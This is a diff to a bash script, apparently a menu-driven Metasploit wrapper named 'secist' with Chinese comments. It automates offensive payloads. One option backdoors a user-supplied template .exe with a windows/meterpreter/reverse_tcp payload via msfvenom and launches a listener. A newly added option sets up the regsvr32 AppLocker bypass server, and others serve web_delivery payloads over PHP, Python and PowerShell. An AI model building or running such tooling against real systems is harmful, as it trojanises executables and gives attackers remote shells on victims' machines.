@@ -18,6 +18,7 @@
   echo "   "
   sleep 1
   echo "   "
+  #banner 信息输出 检测程序
   # check msfconsole
   which msfconsole > /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
@@ -55,7 +56,12 @@
   if [ "$msfvenom" == "0" ] ;then
   echo -e 'msfvenom      \e[0;31m【!!】 Not Found, first must be install metasploit\e[0m';
   fi
+  #判断 metasploit是否已安装
+  rm -rf resource
+  rm -rf output
   mkdir resource
+  mkdir output
+  #清除缓存目录，并创建resource目录，放rc文件
   menu()
   {
   clear
@@ -82,10 +88,11 @@
   echo  "################################################################## "
   echo  "#   [1]  web_delivery(php)	       [2]  web_delivery(python) #"
   echo  "#   [3]  web_delivery(powershell)      [4]  文件注入Payload      #"
-  echo  "#   [5]  exit                          [6]  About Me             #"
+  echo  "#   [5]  bypass_server(powershell)     [6]  exit                 #"
+  echo  "#   [7]  About Me                                                #"
   echo  "################################################################## "
   echo ""
-  echo -e "secist> \c"
+  echo -e "         secist> \c"
   read number
   case $number in
     1)
@@ -132,21 +139,20 @@
     msfconsole -r resource/powershell.rc
     ;;
     4)
-    mkdir output
     echo -e "         secist>请输入你的ip地址: \c"
     read ip
     echo -e "         secist>请输入你的端口: \c"
     read port
-    echo -e "         secist>请输入你放入的文件名称: \c"
+    echo -e "         secist>请放入模板文件到当前目录，并输入你放入的文件名称: \c"
     read file
     echo -e "         secist>请输入你的保存的文件名称: \c"
     read output
-    echo " 请稍等几分钟，您的烤鱼即将出炉========》"
+    echo " 请稍等几分钟，您的烤鱼即将出炉=====================================》"
     echo  "################################################################## "
     echo ""
     sleep 2
     meun2
-    msfvenom -a x86 --platform windows -x $file.exe -k -p windows/meterpreter/reverse_tcp  LHOST=$ip LPORT=$port –b “\ x00”  -f exe > output/$output.exe
+    msfvenom -a x86 --platform windows -x $file.exe -k -p windows/meterpreter/reverse_tcp  LHOST=$ip LPORT=$port –b “\ x00”  -f exe  >$output.exe
     sleep 1
     echo -e "Do you start the payload handler? y or n: \c"
     read handler
@@ -157,12 +163,25 @@
     echo "set LPORT $port" >>  resource/handler.rc
     echo "exploit " >>  resource/handler.rc
     msfconsole -r  resource/handler.rc
-   fi
+    fi
     ;;
     5)
+    echo -e "       secist>请输入你的ip地址: \c"
+    read ip
+    echo -e "       secist>请输入你的端口: \c"
+    read port
+    echo  "################################################################## "
+    echo "use exploit/windows/misc/regsvr32_applocker_bypass_server" >> resource/bypass.rc
+    echo "set LHOST $ip" >> resource/bypass.rc
+    echo "set LPORT $port" >> resource/bypass.rc
+    echo "set URIPATH /" >> resource/bypass.rc
+    echo "run" >> resource/bypass.rc
+    msfconsole -r resource/bypass.rc
+    ;;
+    6)
         exit
         ;;
-    6)
+    7)
       menu1
       ;;
     *)
@@ -171,7 +190,7 @@
     esac
 
 }
-
+#以上为主菜单功能，输入6返回二级菜单栏目，输入其他选项，再次进入主菜单。
 
 menu1()
 {
@@ -199,7 +218,7 @@ echo "  "
 echo -e "                         secist> \c"
 read number
 case $number in
-
+#二级菜单功能
     1)
         menu
         ;;
@@ -222,6 +241,7 @@ echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
 echo -e "  | OUTPUTNAME ||  The Filename output    || $output.exe            "
 echo -e "  +------------++-------------------------++-----------------------+"
 }
+#定义三级菜单，输出输入的详细信息
 menu
-rm -rf resource
-rm -rf output
+#定义菜单栏menu 为主菜单
+
